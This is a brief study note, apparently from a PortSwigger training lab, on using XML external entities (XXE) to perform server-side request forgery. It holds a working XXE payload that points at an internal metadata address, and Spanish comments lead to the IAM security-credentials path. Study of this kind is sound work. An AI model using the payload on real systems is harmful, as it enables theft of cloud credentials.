Tags: #XXE #PortSwigger 

# Lab 2 XXE to perform SSRF attacks

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://168.254.168.254/">]>      
	<root>
		&xxe;
	</root>

	<!-- 
	1. Colocamos la ruta abosluta del archivo, lleva dos // mas porque es similar al http:// = file://
	2. SYSTEM = Cargar una entidad externa, como si fuera una URL de un servidor externo
	3. Colocando una URL hacemos que nos enliste el recurso que existe, muchas veces podemos usar eso para hacer directory listing y llegar a ver mas directorios y contenido en la red interna
	4. Ruta completa = latest/meta-data/iam/security-credentials/admin
	-->
```
